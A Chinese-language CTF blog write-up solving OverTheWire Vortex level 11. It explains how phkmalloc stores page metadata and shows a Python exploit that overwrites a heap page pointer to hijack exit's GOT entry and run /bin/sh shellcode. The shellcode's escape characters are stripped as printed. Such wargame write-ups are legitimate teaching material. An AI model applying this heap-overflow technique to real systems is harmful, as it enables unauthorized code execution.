---
title: OverTheWire Vertex Level 11 → Level 12
author: Ripples
layout: post
views:
  - 224
categories:
  - CTF
tags:
  - buffer overflow
  - vortex
  - wargame
  - WriteUp
---
<p style="text-indent: 2em;">
  这应该是第二次看到堆溢出的题，上次是babyfirst-heap，但不得不说，堆溢出真蛋疼，堆管理方法就一大堆，要想做堆溢出必须得先搞清楚其用的堆。
</p>

<p style="text-indent: 2em;">
  原题参见<a href="http://overthewire.org/wargames/vortex/vortex11.html" target="_blank">这里</a>。从看到那一堆参考资料和长长的phkmalloc.c起就感觉整个世界都不好了。。。
</p>

<p style="text-indent: 2em;">
  不过东西虽多，搞清楚关键几点这题就能解决了。
</p>

<p style="text-indent: 2em;">
  首先讲下phkmalloc的几个概念：
</p>

<!--more-->

<ul class=" list-paddingleft-2" style="list-style-type: disc;">
  <li>
    <p style="text-indent: 2em;">
      malloc_pagesize：内存页一页的大小
    </p>
  </li>

  <li>
    <p style="text-indent: 2em;">
      malloc_pageshift：满足1 <<&nbsp;malloc_pageshift =&nbsp;<span style="text-indent: 32px;">malloc_pagesize</span>
    </p>
  </li>

  <li>
    <p style="text-indent: 2em;">
      <span style="text-indent: 32px;">malloc_pagemask：为malloc_pagesize &#8211; 1，从而使得addr % malloc_pagesize转化为addr & malloc_pagemask</span>
    </p>
  </li>

  <li>
    <p style="text-indent: 2em;">
      <span style="text-indent: 32px;">malloc_origo：整个堆的起始地址 /&nbsp;<span style="text-indent: 32px;">malloc_pagesize，从而使得idx = ( page_address / malloc_pagesize ) &#8211; malloc_origo，idx为堆中页的编号</span></span>
    </p>
  </li>
</ul>

<p style="text-indent: 2em;">
  在phkmalloc中，每一页中的所有chunk大小相同，chunk分成三种大小，大的是指大小超过页大小一半的，中等和小的区别在于，对于中等大小的chunk，其堆头控制信息存储在专门的一个页上，对于小的chunk，其堆头控制信息存储在该chunk所在页。
</p>

<p style="text-indent: 2em;">
  现在让我们看看题目中的程序：
</p>

<pre class="brush:cpp;toolbar:false">#include&nbsp;&lt;stdio.h&gt;
#include&nbsp;&lt;string.h&gt;

int&nbsp;main(int&nbsp;argc,&nbsp;char&nbsp;**argv)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*p;
&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*q;
&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*r;
&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*s;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(argc&nbsp;&lt;&nbsp;3)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;p&nbsp;=&nbsp;(char&nbsp;*)&nbsp;malloc(0x800);
&nbsp;&nbsp;&nbsp;&nbsp;q&nbsp;=&nbsp;(char&nbsp;*)&nbsp;malloc(0x10);
&nbsp;&nbsp;&nbsp;&nbsp;r&nbsp;=&nbsp;(char&nbsp;*)&nbsp;malloc(0x800);
&nbsp;&nbsp;&nbsp;&nbsp;strcpy(r&nbsp;,&nbsp;argv[1]);
&nbsp;&nbsp;&nbsp;&nbsp;s&nbsp;=&nbsp;(char&nbsp;*)&nbsp;malloc(0x10);
&nbsp;&nbsp;&nbsp;&nbsp;strncpy(s&nbsp;,&nbsp;argv[2],&nbsp;0xf);
&nbsp;&nbsp;&nbsp;&nbsp;exit(0);
}</pre>

<p style="text-indent: 2em;">
  程序一共分配了4次，两个0x<a></a>800（中等chunk），两个0x<a></a>10（小chunk），通过gdb观察一下分配出来的内存，发现分别为p = 0x804E000、q = 0x<span style="text-indent: 32px;">804F030</span>、r = 0x<span style="text-indent: 32px;">804E800</span>、s = 0x804F040，我们很明显可以看出，strcpy的时候，我们可以通过r，覆盖q所在页上的堆头信息，堆头信息结构：
</p>

<pre class="brush:cpp;toolbar:false">struct&nbsp;pginfo&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;pginfo&nbsp;&nbsp;&nbsp;*next;&nbsp;&nbsp;/*&nbsp;next&nbsp;on&nbsp;the&nbsp;free&nbsp;list&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;void&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*page;&nbsp;&nbsp;/*&nbsp;Pointer&nbsp;to&nbsp;the&nbsp;page&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;u_short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;size;&nbsp;&nbsp;&nbsp;/*&nbsp;size&nbsp;of&nbsp;this&nbsp;page&#39;s&nbsp;chunks&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;u_short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shift;&nbsp;&nbsp;/*&nbsp;How&nbsp;far&nbsp;to&nbsp;shift&nbsp;for&nbsp;this&nbsp;size&nbsp;chunks&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;u_short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;free;&nbsp;&nbsp;&nbsp;/*&nbsp;How&nbsp;many&nbsp;free&nbsp;chunks&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;u_short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;total;&nbsp;&nbsp;/*&nbsp;How&nbsp;many&nbsp;chunk&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;u_int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bits[1];&nbsp;/*&nbsp;Which&nbsp;chunks&nbsp;are&nbsp;free&nbsp;*/
};</pre>

<p style="text-indent: 2em;">
  在这里，我们需要的是改变s的值，也就是最后一次分配出来的内存地址，这样我们才能在后面的strncpy中修改我们想要修改的位置。然后查看malloc会发现，分配好后返回的指针是(u_char *)bp->page + k，也就是说是由pginfo中的page加上偏移值，那么之前的0x804F040也就是0x804F000+0x<a></a>40，这样，我们只要覆盖掉page，就能够将s改成GOT表的位置，从而在exit(0)的时候获取对程序的控制。
</p>

<p style="text-indent: 2em;">
  objdump查看：
</p>

<pre class="brush:plain;toolbar:false;">080485f0&nbsp;&lt;exit@plt&gt;:
&nbsp;80485f0:	ff&nbsp;25&nbsp;1c&nbsp;c0&nbsp;04&nbsp;08&nbsp;&nbsp;&nbsp;&nbsp;	jmp&nbsp;&nbsp;&nbsp;&nbsp;*0x804c01c
&nbsp;80485f6:	68&nbsp;38&nbsp;00&nbsp;00&nbsp;00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	push&nbsp;&nbsp;&nbsp;$0x38
&nbsp;80485fb:	e9&nbsp;70&nbsp;ff&nbsp;ff&nbsp;ff&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	jmp&nbsp;&nbsp;&nbsp;&nbsp;8048570&nbsp;&lt;_init+0x30&gt;</pre>

<p style="text-indent: 2em;">
  那么我们要将page改为0x804c01c &#8211; 0x<a></a>40 = 0x804bfdc，然后栈底地址为0xffffe000，<span style="text-indent: 2em;">于是乎得到启动程序如下：</span>
</p>

<pre class="brush:python;toolbar:false">#!/usr/bin/env&nbsp;python

import&nbsp;subprocess

addr&nbsp;=&nbsp;&#39;x04xdfxffxff&#39;
got_addr&nbsp;=&nbsp;&#39;xdcxbfx04x08&#39;
shellcode&nbsp;=&nbsp;"jx0bXx991xc9Rh//shh/binx89xe3xcdx80"
subprocess.Popen([&#39;/vortex/vortex11&#39;,&nbsp;&#39;x90&#39;&nbsp;*&nbsp;0x804&nbsp;+&nbsp;got_addr&nbsp;,&nbsp;addr&nbsp;+&nbsp;&#39;x90&#39;&nbsp;*&nbsp;500&nbsp;+&nbsp;shellcode],&nbsp;env&nbsp;=&nbsp;{}).communicate()</pre>

<p style="text-indent: 2em;">
  运行之，成功拿到shell。
</p>
